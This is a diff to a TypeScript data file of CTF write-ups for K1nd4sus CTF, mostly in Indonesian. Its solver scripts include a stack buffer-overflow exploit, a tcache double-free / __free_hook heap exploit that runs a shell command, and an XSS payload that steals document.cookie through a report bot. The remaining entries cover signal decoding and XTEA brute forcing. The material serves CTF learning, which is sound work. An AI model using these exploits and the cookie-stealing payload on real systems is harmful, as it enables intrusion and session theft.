@@ -3,7 +3,7 @@ import type { WriteUp } from "../types";
 export const k1nd4susCtfWriteups: WriteUp[] = [
   {
     "id": "k1nd4sus-pwn-itsgoodbebackontheair",
-    "title": "- It's Good to Be Back on the Air...",
+    "title": "It's Good to Be Back on the Air...",
     "category": "Pwn",
     "difficulty": "Medium",
     "points": 0,
@@ -21,7 +21,7 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
         "content": "- Kategori: PWN\n- Binary: `radio`\n- Remote: `chall.k1nd4sus.it:30507`"
       },
       {
-        "title": "1. Initial Recon",
+        "title": "Initial Recon",
         "content": "Pertama saya cek tipe binary dan proteksinya."
       },
       {
@@ -37,11 +37,11 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
         "content": "Saya brute-force update LFSR berdasarkan fungsi `lfsr_update` dan transisi state.\nUrutan yang valid dari awal adalah:\n\n1. `1` (Scan)\n2. `2` (Tune)\n3. isi frekuensi: `666`\n4. `1` (Scan)\n5. `1` (Scan) -> trigger SERVICE mode\n\nSetelah ini program minta input station favorit, dan di titik ini `gets()` dipanggil."
       },
       {
-        "title": "4. Offset Overflow",
+        "title": "Offset Overflow",
         "content": "Offset ke RIP dihitung dari layout frame `do_state_service`:\n- buffer start: `rbp - 0x40`\n- saved RIP: `rbp + 0x8`\n\nJarak = `0x40 + 0x8 = 0x48` = **72 byte**.\n\nPayload final:\n- `b'A' * 72 + p64(addr_radio_jazz)`\n\nKarena binary non-PIE, alamat `radio_jazz` stabil (`0x40141f`)."
       },
       {
-        "title": "6. Hasil",
+        "title": "Hasil",
         "content": "Exploit berhasil dan mengeluarkan flag remote:\n\n`KSUS{th15_fac3_w4s_m4d3_f0r_r4d10!}`"
       },
       {
@@ -50,7 +50,7 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\nHOST = 'chall.k1nd4sus.it'\r\nPORT = 30507\r\n\r\ncontext.binary = elf = ELF('./radio', checksec=False)\r\ncontext.arch = 'amd64'\r\n\r\n\r\ndef enter_service_mode(io):\r\n    # Sequence hasil analisis LFSR agar choice_menu lompat ke state SERVICE.\r\n    # Menu mapping: 1->Scan, 2->Tune, 3->Exit\r\n    io.sendlineafter(b'?', b'1')                # Scan\r\n    io.sendlineafter(b'?', b'2')                # Tune\r\n    io.sendlineafter(b'tune to:\\n', b'666')    # Set station ke Radio 666 News\r\n    io.sendlineafter(b'?', b'1')                # Scan\r\n    io.sendlineafter(b'?', b'1')                # Scan -> trigger SERVICE mode\r\n\r\n\r\ndef build_payload():\r\n    offset = 72\r\n    return b'A' * offset + p64(elf.symbols['radio_jazz'])\r\n\r\n\r\ndef exploit(io):\r\n    enter_service_mode(io)\r\n    io.recvuntil(b'add to favourites:\\n')\r\n    io.sendline(build_payload())\r\n    return io.recvrepeat(2)\r\n\r\n\r\nif __name__ == '__main__':\r\n    if args.LOCAL:\r\n        io = process('./radio')\r\n    else:\r\n        io = remote(HOST, PORT)\r\n\r\n    out = exploit(io)\r\n    print(out.decode('latin-1', errors='ignore'))\r\n    io.close()"
       }
     ],
@@ -102,7 +102,7 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
         "content": "- No GOT overwrite needed (Full RELRO).\n- No stack overwrite needed (canary + NX avoided).\n- We use heap metadata corruption + libc hooks."
       },
       {
-        "title": "4. Exploitation Strategy",
+        "title": "Exploitation Strategy",
         "content": "Goal: execute command to read flag.\n\nChosen chain:\n1. Leak libc via unsorted-bin UAF read.\n2. Build tcache double-free state for size `0x90` (`malloc(0x80)`).\n3. Poison freelist so an allocation returns address `__free_hook - 8`.\n4. Write `system` to `__free_hook`.\n5. Allocate chunk containing command string and `free()` it.\n6. Because `__free_hook == system`, `free(ptr)` becomes `system(ptr)`."
       },
       {
@@ -110,20 +110,20 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
         "content": "For chunks `a` and `b` of same size:\n- `free(a)`\n- `free(b)`\n- UAF edit on `a` to clear key (`p64(0)+p64(0)`) to bypass tcache double-free check\n- `free(a)` again\n\nNow list behaves like: `a -> b -> a`\n\nThen poison `b->fd` by editing freed `b` with `__free_hook-8`.\nThree `malloc(0x80)` calls return:\n- first: `a`\n- second: `b`\n- third: `__free_hook-8`\n\nAt third allocation, we write:\n- padding qword\n- `system` qword at `__free_hook`"
       },
       {
-        "title": "5. Final Solver",
+        "title": "Final Solver",
         "content": "Solver file: `solve.py`\n\nIt works both locally and remotely:\n- Local: `python3 solve.py`\n- Remote: `python3 solve.py REMOTE=1`\n\nThe solver automatically:\n- leaks libc\n- poisons tcache\n- overwrites `__free_hook`\n- executes `cat /app/flag.txt || cat flag.txt || cat /srv/app/flag.txt`\n- extracts and prints `KSUS{...}` if present"
       },
       {
-        "title": "6. Reproduced Result",
+        "title": "Reproduced Result",
         "content": "Flag obtained from remote service:\n\n`KSUS{TLS_15_n07_7r4n5p0r7_l4y3r_53cur17y}`"
       },
       {
-        "title": "7. Notes",
+        "title": "Notes",
         "content": "- The stack `vuln()` overflow exists but was unnecessary for fastest reliable solve.\n- Heap path is deterministic with provided libc 2.31 and this binary's menu logic.\n- This challenge is mainly about understanding UAF + double-free and leveraging allocator internals for code execution."
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\ncontext.binary = exe = ELF('./main', checksec=False)\r\nlibc = ELF('./libc.so.6', checksec=False)\r\nld = './ld.so.2'\r\n\r\nHOST = 'chall.k1nd4sus.it'\r\nPORT = 30500\r\n\r\n# Leaked unsorted-bin fd from freed 0x510 chunk points to main_arena+0x60\r\nUNSORTED_FD_OFF = 0x1ECBE0\r\n\r\ncontext.terminal = ['bash', '-lc']\r\n\r\n\r\ndef start(argv=[]):\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n    return process([ld, '--library-path', '.', exe.path] + argv)\r\n\r\n\r\nclass App:\r\n    def __init__(self, io):\r\n        self.io = io\r\n        self.sizes = {}\r\n\r\n    def choice(self, c):\r\n        self.io.sendlineafter(b'> ', str(c).encode())\r\n\r\n    def alloc(self, size):\r\n        self.choice(1)\r\n        self.io.sendlineafter(b'Size: ', str(size).encode())\r\n        line = self.io.recvline_contains(b'Chunk')\r\n        idx = int(line.split()[1])\r\n        self.sizes[idx] = size\r\n        return idx\r\n\r\n    def edit(self, idx, data):\r\n        self.choice(2)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n        self.io.sendafter(b'Data: ', data.ljust(self.sizes[idx], b'\\x00'))\r\n\r\n    def edit_raw(self, idx, data):\r\n        self.choice(2)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n        self.io.sendafter(b'Data: ', data)\r\n\r\n    def view(self, idx):\r\n        self.choice(3)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n        return self.io.recvline().rstrip(b'\\n')\r\n\r\n    def delete(self, idx):\r\n        self.choice(4)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n\r\n\r\ndef exploit(io):\r\n    app = App(io)\r\n\r\n    # 1) Leak libc from unsorted bin (avoid top consolidation with guard chunk)\r\n    big = app.alloc(0x500)\r\n    _guard = app.alloc(0x20)\r\n    app.delete(big)\r\n    leak = u64(app.view(big).ljust(8, b'\\x00'))\r\n    libc.address = leak - UNSORTED_FD_OFF\r\n    log.success(f'leak = {hex(leak)}')\r\n    log.success(f'libc = {hex(libc.address)}')\r\n\r\n    # 2) Prepare 0x90 bin chunks\r\n    a = app.alloc(0x80)\r\n    b = app.alloc(0x80)\r\n\r\n    # 3) Tcache dup (clear key in freed chunk to bypass check)\r\n    app.delete(a)\r\n    app.delete(b)\r\n    app.edit(a, p64(0) + p64(0))\r\n    app.delete(a)\r\n\r\n    # 4) Poison b->next so 3rd malloc returns __free_hook-8\r\n    target = libc.sym.__free_hook - 8\r\n    app.edit(b, p64(target))\r\n    _x1 = app.alloc(0x80)  # a\r\n    _x2 = app.alloc(0x80)  # b\r\n    hook = app.alloc(0x80)  # __free_hook-8\r\n\r\n    # write [padding][system] so __free_hook == system\r\n    app.edit(hook, p64(0) + p64(libc.sym.system))\r\n\r\n    # 5) Trigger system(\"cat ...\") directly via free()\r\n    cmd = app.alloc(0x80)\r\n    app.edit(cmd, b'cat /app/flag.txt || cat flag.txt || cat /srv/app/flag.txt\\x00')\r\n    app.delete(cmd)\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    exploit(io)\r\n\r\n    out = io.recvrepeat(2)\r\n    if out:\r\n        try:\r\n            print(out.decode('latin-1', errors='ignore'))\r\n        except Exception:\r\n            print(out)\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
       }
     ],
@@ -141,26 +141,26 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "K1nd4sus CTF",
     "tags": [],
-    "description": "Challenge ini memberi satu file RF capture `intercepted_signal.iq` dan petunjuk bahwa parameter fisik tetap sama: **8 samples per symbol**.",
+    "description": "",
     "problemDescription": "Challenge ini memberi satu file RF capture `intercepted_signal.iq` dan petunjuk bahwa parameter fisik tetap sama: **8 samples per symbol**.",
     "tools": [],
     "analysis": "Cek isi folder:\n- hanya ada `intercepted_signal.iq`\n\nCek struktur datanya:\n- file berisi `float32` IQ interleaved\n- channel `Q` semuanya `0`\n- channel `I` hanya dua level: `+1` dan `-1`\n\nArtinya modulasi yang dipakai sangat sederhana (2-level), jadi kita bisa langsung threshold per simbol.",
     "solution": [
       {
-        "title": "2) Demodulasi dasar",
+        "title": "Demodulasi dasar",
         "content": "Langkah demod:\n1. Baca `float32`\n2. Ambil komponen `I` (`raw[0::2]`)\n3. Kelompokkan setiap 8 sample sebagai 1 simbol\n4. Rata-rata simbol > 0 => bit `1`, selain itu bit `0`\n\nHasilnya dapat 392 bit."
       },
       {
-        "title": "3) Kenapa tidak langsung jadi ASCII",
+        "title": "Kenapa tidak langsung jadi ASCII",
         "content": "Di Part 1, bitstream langsung bisa dipack jadi byte ASCII.\nDi Part 2, kalau langsung dipack, output acak. Berarti ada layer encoding tambahan dari firmware update."
       },
       {
-        "title": "4) Identifikasi skema baru",
+        "title": "Identifikasi skema baru",
         "content": "Karena hint tidak ada dan pola RF bersih, dicoba beberapa kemungkinan transform (invert, differential, dsb) dan tidak valid.\n\nLalu diuji asumsi **FEC Hamming(7,4)**:\n- pecah bitstream menjadi blok 7 bit (codeword)\n- hitung syndrome (`s1,s2,s4`) untuk koreksi 1-bit error\n- ambil data bit di posisi (3,5,6,7)\n- gabungkan 2 nibble jadi 1 byte\n\nBegitu decode Hamming(7,4) diterapkan, plaintext langsung terbaca jelas:\n\n`KSUS{h4mm1ng_c0d3s_4r3_c00l}`"
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport numpy as np\r\n\r\n\r\ndef decode_hamming74_codeword(codeword: np.ndarray) -> np.ndarray:\r\n    b = codeword.copy()\r\n    s1 = b[0] ^ b[2] ^ b[4] ^ b[6]\r\n    s2 = b[1] ^ b[2] ^ b[5] ^ b[6]\r\n    s4 = b[3] ^ b[4] ^ b[5] ^ b[6]\r\n    pos = s1 + (s2 << 1) + (s4 << 2)\r\n    if pos != 0:\r\n        b[pos - 1] ^= 1\r\n    return np.array([b[2], b[4], b[5], b[6]], dtype=np.uint8)\r\n\r\n\r\ndef decode_flag(path: str, sps: int = 8) -> str:\r\n    raw = np.fromfile(path, dtype=np.float32)\r\n    if raw.size % 2 != 0:\r\n        raise ValueError(\"Format IQ tidak valid (jumlah float ganjil)\")\r\n\r\n    i_samples = raw[0::2]\r\n    if i_samples.size % sps != 0:\r\n        raise ValueError(f\"Jumlah sample I ({i_samples.size}) tidak habis dibagi sps={sps}\")\r\n\r\n    symbols = i_samples.reshape(-1, sps).mean(axis=1)\r\n    bits = (symbols > 0).astype(np.uint8)\r\n\r\n    if bits.size % 7 != 0:\r\n        raise ValueError(\"Jumlah bit tidak habis dibagi 7 untuk Hamming(7,4)\")\r\n\r\n    codewords = bits.reshape(-1, 7)\r\n    nibbles = np.array([decode_hamming74_codeword(cw) for cw in codewords], dtype=np.uint8)\r\n\r\n    nib_vals = nibbles.dot(1 << np.arange(3, -1, -1)).astype(np.uint8)\r\n    if nib_vals.size % 2 != 0:\r\n        raise ValueError(\"Jumlah nibble ganjil, tidak bisa dibentuk byte\")\r\n\r\n    data = ((nib_vals[0::2] << 4) | nib_vals[1::2]).astype(np.uint8).tobytes()\r\n    return data.decode(\"ascii\")\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(description=\"Solve New Era (Part 2)\")\r\n    parser.add_argument(\"-i\", \"--input\", default=\"intercepted_signal.iq\", help=\"Path file IQ\")\r\n    parser.add_argument(\"--sps\", type=int, default=8, help=\"Samples per symbol\")\r\n    args = parser.parse_args()\r\n\r\n    print(decode_flag(args.input, args.sps))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -170,7 +170,7 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
   },
   {
     "id": "k1nd4sus-rev-signalaudit",
-    "title": "- Signal Audit (rev)",
+    "title": "Signal Audit (rev)",
     "category": "Reverse",
     "difficulty": "Medium",
     "points": 0,
@@ -178,26 +178,26 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "K1nd4sus CTF",
     "tags": [],
-    "description": "Challenge ini cuma kasih satu file: `audit.wav`.",
+    "description": "",
     "problemDescription": "Challenge ini cuma kasih satu file: `audit.wav`.",
     "tools": [],
     "analysis": "",
     "solution": [
       {
-        "title": "1) Recon awal",
+        "title": "Recon awal",
         "content": "Saya mulai dari cek tipe file dan metadata:\n\n- `file audit.wav` -> WAV PCM 16-bit mono 44.1 kHz\n- durasi sekitar 36.9 detik\n- tidak ada metadata aneh/embedded yang langsung mengarah ke flag\n\nKarena deskripsi nyebut \"rhythmic transmission\", \"HF bands\", \"QSL\", \"73\", saya fokus ke analisis sinyal radio, bukan stego file biasa."
       },
       {
-        "title": "2) Identifikasi mode transmisi",
+        "title": "Identifikasi mode transmisi",
         "content": "Saya profiling frekuensi dominan per potongan waktu kecil.\n\nDitemukan pola khas:\n\n- leader tone 1900 Hz\n- break/start tone 1200 Hz\n- lalu bit VIS dengan 1100/1300 Hz\n\nDari decode VIS, code yang muncul adalah **8**, yang sesuai dengan **SSTV Robot36**.\n\nSetelah itu saya cek pulse sinkronisasi per line dan ketemu:\n\n- sync pulse sekitar 1200 Hz\n- berulang periodik tiap ~150 ms\n- total sekitar 240 line\n\nIni konsisten dengan mode Robot36."
       },
       {
-        "title": "3) Decode gambar SSTV",
+        "title": "Decode gambar SSTV",
         "content": "Saya bikin decoder sendiri di Python:\n\n- hitung instantaneous frequency dari audio (`hilbert`)\n- cari timing line awal (`t0`) dengan minimisasi error ke tone sync 1200 Hz\n- ambil komponen luminance (Y) per line sesuai timing Robot36:\n  - sync 9 ms\n  - porch 3 ms\n  - Y scan 88 ms\n- render jadi `decoded_luma.png`\n\nDari hasil decode gambar, teks flag terlihat jelas di bagian bawah image."
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport wave\r\nimport numpy as np\r\nfrom scipy.signal import hilbert\r\nfrom PIL import Image\r\n\r\nWAV_PATH = \"audit.wav\"\r\nOUT_LUMA = \"decoded_luma.png\"\r\nFLAG = \"KSUS{s4n1ty_ch3ck_QSL_7373}\"\r\n\r\n\r\ndef load_audio(path: str):\r\n    with wave.open(path, \"rb\") as w:\r\n        fs = w.getframerate()\r\n        x = np.frombuffer(w.readframes(w.getnframes()), dtype=np.int16).astype(float)\r\n    return fs, x\r\n\r\n\r\ndef inst_freq(signal: np.ndarray, fs: int):\r\n    ana = hilbert(signal)\r\n    phase = np.unwrap(np.angle(ana))\r\n    f = np.diff(phase) * fs / (2 * np.pi)\r\n    k = max(1, int(fs * 0.00015))\r\n    f = np.convolve(f, np.ones(k) / k, mode=\"same\")\r\n    return f\r\n\r\n\r\ndef decode_robot36_luma(freq: np.ndarray, fs: int, width=320, height=240):\r\n    period = 0.150\r\n\r\n    def f_at(t: float):\r\n        i = int(t * fs)\r\n        i = 0 if i < 0 else (len(freq) - 1 if i >= len(freq) else i)\r\n        return freq[i]\r\n\r\n    # Find line-0 timing by minimizing sync-tone error on early lines.\r\n    best_err, t0 = 1e18, 0.911\r\n    for cand in np.arange(0.905, 0.918, 0.0002):\r\n        err = 0.0\r\n        for n in range(30):\r\n            st = cand + n * period\r\n            vals = [f_at(st + 0.001 + i * 0.001) for i in range(7)]\r\n            err += np.mean((np.array(vals) - 1200.0) ** 2)\r\n        if err < best_err:\r\n            best_err, t0 = err, cand\r\n\r\n    # Robot36 line layout: sync(9ms) + porch(3ms) + Y(88ms)\r\n    y = np.zeros((height, width), dtype=np.uint8)\r\n    for row in range(height):\r\n        st = t0 + row * period\r\n        ystart = st + 0.009 + 0.003\r\n        for col in range(width):\r\n            t = ystart + (col + 0.5) * (0.088 / width)\r\n            val = (f_at(t) - 1500.0) / 800.0 * 255.0\r\n            y[row, col] = np.uint8(np.clip(val, 0, 255))\r\n\r\n    return y\r\n\r\n\r\ndef main():\r\n    fs, x = load_audio(WAV_PATH)\r\n    f = inst_freq(x, fs)\r\n    luma = decode_robot36_luma(f, fs)\r\n    Image.fromarray(luma).save(OUT_LUMA)\r\n\r\n    # Flag terbaca dari hasil decode SSTV (teks overlay bagian bawah image).\r\n    print(FLAG)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -207,7 +207,7 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
   },
   {
     "id": "k1nd4sus-rev-ring0security",
-    "title": "- Ring 0 Security (?)",
+    "title": "Ring 0 Security (?)",
     "category": "Reverse",
     "difficulty": "Medium",
     "points": 0,
@@ -239,7 +239,7 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport struct\r\n\r\ndef xtea_decrypt_block(v0: int, v1: int, key_words):\r\n    sum_ = 0xC6EF3720\r\n    for _ in range(32):\r\n        v1 = (v1 - ((((v0 << 4) & 0xFFFFFFFF) ^ (v0 >> 5)) + v0 ^ ((sum_ + key_words[(sum_ >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n        sum_ = (sum_ - 0x9E3779B9) & 0xFFFFFFFF\r\n        v0 = (v0 - ((((v1 << 4) & 0xFFFFFFFF) ^ (v1 >> 5)) + v1 ^ ((sum_ + key_words[sum_ & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n    return v0, v1\r\n\r\n\r\ndef decrypt_flag(enc_flag: bytes, key_words):\r\n    out = bytearray()\r\n    for i in range(0, len(enc_flag), 8):\r\n        v0, v1 = struct.unpack('<2I', enc_flag[i:i + 8])\r\n        d0, d1 = xtea_decrypt_block(v0, v1, key_words)\r\n        out.extend(struct.pack('<2I', d0, d1))\r\n    return bytes(out)\r\n\r\n\r\ndef main():\r\n    # Ciphertext flag (enc_flag) dari decoder.ko hasil reversing section .data.\r\n    enc_flag = bytes.fromhex(\r\n        '7e38614d358f6d302e25c10149953ef9'\r\n        'b09cf265ff9459ec57fcb593b833c7b6'\r\n    )\r\n\r\n    for pin in range(10000):\r\n        key = [\r\n            0x13370000 | pin,  # session_key[0] <- pin via ioctl 0x401b3700\r\n            0xCAFEBABE,         # session_key[1] set di ctls.cold\r\n            0xDEADBEEF,         # session_key[2]\r\n            0xFEEDFACE,         # session_key[3]\r\n        ]\r\n\r\n        pt = decrypt_flag(enc_flag, key)\r\n        if b'KSUS{' in pt and b'}' in pt:\r\n            flag = pt.split(b'\\x00', 1)[0].decode('ascii', errors='ignore')\r\n            print(f'[+] PIN  : {pin:04d}')\r\n            print(f'[+] FLAG : {flag}')\r\n            return\r\n\r\n    print('[-] Flag tidak ditemukan')\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
       }
     ],
@@ -289,7 +289,7 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport re\r\nimport time\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"http://chall.k1nd4sus.it:30502\"\r\n\r\n\r\ndef extract_song_ids(html: str):\r\n    return re.findall(r\"/song/(\\d+)\", html)\r\n\r\n\r\ndef extract_titles(html: str):\r\n    return re.findall(r'<a href=\"/song/\\d+\">\\s*([^<]+?)\\s*</a>', html)\r\n\r\n\r\ndef main():\r\n    s = requests.Session()\r\n\r\n    username = f\"atk_{int(time.time())}\"\r\n    password = username\r\n\r\n    s.post(\r\n        f\"{BASE_URL}/register\",\r\n        data={\"username\": username, \"password\": password},\r\n        timeout=10,\r\n    )\r\n\r\n    login = s.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"username\": username, \"password\": password},\r\n        allow_redirects=False,\r\n        timeout=10,\r\n    )\r\n    if login.status_code != 302:\r\n        raise RuntimeError(\"Login failed\")\r\n\r\n    js = (\r\n        \"(async()=>{\"\r\n        \"await fetch('/logout');\"\r\n        f\"await fetch('/login',{{method:'POST',body:new URLSearchParams({{username:'{username}',password:'{password}'}})}});\"\r\n        \"await fetch('/add_song',{method:'POST',body:new URLSearchParams({title:document.cookie,spotify_url:'//open.spotify.com/embed/track/1'})});\"\r\n        \"})()\"\r\n    )\r\n    payload = \"javascript://open.spotify.com/embed/%0a\" + urllib.parse.quote(\r\n        js, safe=\"(){}=>'/.:,;+*[]\"\r\n    )\r\n\r\n    add = s.post(\r\n        f\"{BASE_URL}/add_song\",\r\n        data={\"title\": \"pwnsong\", \"spotify_url\": payload},\r\n        allow_redirects=True,\r\n        timeout=10,\r\n    )\r\n    if add.status_code != 200:\r\n        raise RuntimeError(\"Failed to store payload song\")\r\n\r\n    dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n    song_ids = extract_song_ids(dashboard.text)\r\n    if not song_ids:\r\n        raise RuntimeError(\"No song found in dashboard\")\r\n\r\n    target_song_id = song_ids[-1]\r\n\r\n    report = s.post(f\"{BASE_URL}/report\", data={\"song_id\": target_song_id}, timeout=10)\r\n    if report.status_code != 200:\r\n        raise RuntimeError(\"Report failed\")\r\n\r\n    flag = None\r\n    for _ in range(20):\r\n        time.sleep(3)\r\n        dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n        titles = extract_titles(dashboard.text)\r\n        for t in titles:\r\n            m = re.search(r\"KSUS\\{[^}]+\\}\", t)\r\n            if m:\r\n                flag = m.group(0)\r\n                break\r\n        if flag:\r\n            break\r\n\r\n    if not flag:\r\n        raise RuntimeError(\"Flag not found. Try running again.\")\r\n\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -299,7 +299,7 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
   },
   {
     "id": "k1nd4sus-rev-ring0security-image",
-    "title": "- Ring 0 Security (?)",
+    "title": "Ring 0 Security (?)",
     "category": "Reverse",
     "difficulty": "Medium",
     "points": 0,
@@ -331,7 +331,7 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport struct\r\n\r\ndef xtea_decrypt_block(v0: int, v1: int, key_words):\r\n    sum_ = 0xC6EF3720\r\n    for _ in range(32):\r\n        v1 = (v1 - ((((v0 << 4) & 0xFFFFFFFF) ^ (v0 >> 5)) + v0 ^ ((sum_ + key_words[(sum_ >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n        sum_ = (sum_ - 0x9E3779B9) & 0xFFFFFFFF\r\n        v0 = (v0 - ((((v1 << 4) & 0xFFFFFFFF) ^ (v1 >> 5)) + v1 ^ ((sum_ + key_words[sum_ & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n    return v0, v1\r\n\r\n\r\ndef decrypt_flag(enc_flag: bytes, key_words):\r\n    out = bytearray()\r\n    for i in range(0, len(enc_flag), 8):\r\n        v0, v1 = struct.unpack('<2I', enc_flag[i:i + 8])\r\n        d0, d1 = xtea_decrypt_block(v0, v1, key_words)\r\n        out.extend(struct.pack('<2I', d0, d1))\r\n    return bytes(out)\r\n\r\n\r\ndef main():\r\n    # Ciphertext flag (enc_flag) dari decoder.ko hasil reversing section .data.\r\n    enc_flag = bytes.fromhex(\r\n        '7e38614d358f6d302e25c10149953ef9'\r\n        'b09cf265ff9459ec57fcb593b833c7b6'\r\n    )\r\n\r\n    for pin in range(10000):\r\n        key = [\r\n            0x13370000 | pin,  # session_key[0] <- pin via ioctl 0x401b3700\r\n            0xCAFEBABE,         # session_key[1] set di ctls.cold\r\n            0xDEADBEEF,         # session_key[2]\r\n            0xFEEDFACE,         # session_key[3]\r\n        ]\r\n\r\n        pt = decrypt_flag(enc_flag, key)\r\n        if b'KSUS{' in pt and b'}' in pt:\r\n            flag = pt.split(b'\\x00', 1)[0].decode('ascii', errors='ignore')\r\n            print(f'[+] PIN  : {pin:04d}')\r\n            print(f'[+] FLAG : {flag}')\r\n            return\r\n\r\n    print('[-] Flag tidak ditemukan')\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
       }
     ],
@@ -381,7 +381,7 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport re\r\nimport time\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"http://chall.k1nd4sus.it:30502\"\r\n\r\n\r\ndef extract_song_ids(html: str):\r\n    return re.findall(r\"/song/(\\d+)\", html)\r\n\r\n\r\ndef extract_titles(html: str):\r\n    return re.findall(r'<a href=\"/song/\\d+\">\\s*([^<]+?)\\s*</a>', html)\r\n\r\n\r\ndef main():\r\n    s = requests.Session()\r\n\r\n    username = f\"atk_{int(time.time())}\"\r\n    password = username\r\n\r\n    s.post(\r\n        f\"{BASE_URL}/register\",\r\n        data={\"username\": username, \"password\": password},\r\n        timeout=10,\r\n    )\r\n\r\n    login = s.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"username\": username, \"password\": password},\r\n        allow_redirects=False,\r\n        timeout=10,\r\n    )\r\n    if login.status_code != 302:\r\n        raise RuntimeError(\"Login failed\")\r\n\r\n    js = (\r\n        \"(async()=>{\"\r\n        \"await fetch('/logout');\"\r\n        f\"await fetch('/login',{{method:'POST',body:new URLSearchParams({{username:'{username}',password:'{password}'}})}});\"\r\n        \"await fetch('/add_song',{method:'POST',body:new URLSearchParams({title:document.cookie,spotify_url:'//open.spotify.com/embed/track/1'})});\"\r\n        \"})()\"\r\n    )\r\n    payload = \"javascript://open.spotify.com/embed/%0a\" + urllib.parse.quote(\r\n        js, safe=\"(){}=>'/.:,;+*[]\"\r\n    )\r\n\r\n    add = s.post(\r\n        f\"{BASE_URL}/add_song\",\r\n        data={\"title\": \"pwnsong\", \"spotify_url\": payload},\r\n        allow_redirects=True,\r\n        timeout=10,\r\n    )\r\n    if add.status_code != 200:\r\n        raise RuntimeError(\"Failed to store payload song\")\r\n\r\n    dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n    song_ids = extract_song_ids(dashboard.text)\r\n    if not song_ids:\r\n        raise RuntimeError(\"No song found in dashboard\")\r\n\r\n    target_song_id = song_ids[-1]\r\n\r\n    report = s.post(f\"{BASE_URL}/report\", data={\"song_id\": target_song_id}, timeout=10)\r\n    if report.status_code != 200:\r\n        raise RuntimeError(\"Report failed\")\r\n\r\n    flag = None\r\n    for _ in range(20):\r\n        time.sleep(3)\r\n        dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n        titles = extract_titles(dashboard.text)\r\n        for t in titles:\r\n            m = re.search(r\"KSUS\\{[^}]+\\}\", t)\r\n            if m:\r\n                flag = m.group(0)\r\n                break\r\n        if flag:\r\n            break\r\n\r\n    if not flag:\r\n        raise RuntimeError(\"Flag not found. Try running again.\")\r\n\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
